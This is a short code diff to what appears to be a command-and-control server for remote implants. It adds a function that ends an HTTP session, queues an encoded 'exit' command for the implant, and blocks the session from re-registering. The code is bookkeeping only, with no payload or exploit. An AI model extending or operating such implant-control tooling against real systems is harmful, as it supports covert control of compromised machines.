@@ -53,6 +53,24 @@ class Session:
 # Global sessions dictionary
 sessions = {}
 alias_map: dict[str,str] = {}
+dead_sessions: set[str] = set()
+
+def kill_http_session(sid: str) -> bool:
+    sess = sessions.pop(sid, None)
+    if not sess:
+        return False
+ 
+    # tell the implant to shut down on its next poll
+    sess.command_queue.put(base64.b64encode(b"exit").decode())
+
+    # remember we killed it, so we never re-register it
+    dead_sessions.add(sid)
+ 
+    # clean up any aliases pointing to it
+    for alias, real in list(alias_map.items()):
+        if real == sid:
+            del alias_map[alias]
+    return True
 
 def set_alias(alias: str, sid: str):
     """Point alias → real SID."""
